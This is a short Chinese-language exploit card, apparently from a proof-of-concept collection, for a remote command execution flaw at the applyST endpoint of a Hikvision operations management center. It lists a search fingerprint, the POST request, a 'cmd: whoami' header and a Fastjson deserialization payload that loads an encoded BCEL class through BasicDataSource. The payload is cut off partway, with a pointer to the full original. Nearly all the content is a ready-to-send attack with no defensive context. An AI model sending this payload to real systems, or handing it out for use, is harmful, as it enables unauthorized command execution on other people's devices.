# 海康威视运行管理中心applyST远程代码执行漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`header="X-Content-Type-Options: nosniff"`
- **请求**：`POST /bic/ssoService/v1/applyST HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`cmd: whoami`

**请求体 / payload**
```
{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$…（脚本共 3330 字，完整版见原文）
```
- **预期**：200　|　—